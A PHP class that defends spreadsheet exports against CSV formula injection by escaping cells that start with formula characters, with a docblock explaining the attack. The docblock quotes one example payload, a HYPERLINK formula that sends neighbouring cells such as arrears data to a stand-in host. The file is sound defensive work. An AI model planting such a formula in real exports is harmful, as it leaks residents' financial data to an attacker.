<?php

declare(strict_types=1);

namespace App\Services\Exports;

/**
 * A cell as a spreadsheet will read it: never as a formula it was not meant to be (B074).
 *
 * THE ATTACK. A spreadsheet reads a cell that starts with `=`, `+`, `-` or `@` as a
 * formula, and several strip a leading tab or carriage return first and then do the
 * same. Every CSV this platform writes is opened in Excel — the Exporter's own docblock
 * names it as the reader — and several carry text a stranger typed: a unit claimant's
 * name becomes the household's primary resident on the arrears register once the claim
 * is approved. `=HYPERLINK("https://x.example/?"&A2&B2,"Lot 47")` is a valid full name,
 * and in the Treasurer's copy it is a live link that sends the neighbouring cells — who
 * owes what — to whoever wrote it.
 *
 * THE DEFENCE is the one every spreadsheet understands: a leading apostrophe, which says
 * "this cell is text" and is not shown. The full-width forms (＝ ＋ － ＠) are included,
 * because a spreadsheet running with an East Asian input setting folds them to the
 * ordinary ones before it decides.
 *
 * A NUMBER IS NOT TEXT, and is left exactly as it came. `-1500.00` is a credit balance,
 * `+18765550142` is a telephone number the spreadsheet reads as digits, and `-12.5%` is
 * a rate: none of them can call a function or name a cell, and quoting them would stop
 * the office adding up the column. Only digits, one leading sign, grouping commas, one
 * decimal point and a trailing percent sign count as a number here — anything with a
 * letter, a bracket or a second operator in it is text, and is marked as such.
 */
final class SpreadsheetCell
{
    /** What a spreadsheet may take as the start of a formula. */
    private const FORMULA_STARTS = ['=', '+', '-', '@', "\t", "\r", '＝', '＋', '－', '＠'];

    /** A plain number, as a spreadsheet reads one: sign, digits, grouping, decimals, percent. */
    private const PLAIN_NUMBER = '/^[+-]?\d[\d,]*(?:\.\d+)?%?$/';

    /** One cell, safe to write. Numbers and nulls are returned untouched. */
    public static function safe(string|int|float|null $value): string|int|float|null
    {
        if (! is_string($value) || $value === '' || ! self::startsAFormula($value)) {
            return $value;
        }

        return preg_match(self::PLAIN_NUMBER, $value) === 1 ? $value : "'".$value;
    }

    /**
     * A whole row, safe to write.
     *
     * @param  array<int, string|int|float|null>  $row
     * @return list<string|int|float|null>
     */
    public static function row(array $row): array
    {
        return array_map(self::safe(...), array_values($row));
    }

    private static function startsAFormula(string $value): bool
    {
        foreach (self::FORMULA_STARTS as $start) {
            if (str_starts_with($value, $start)) {
                return true;
            }
        }

        return false;
    }
}
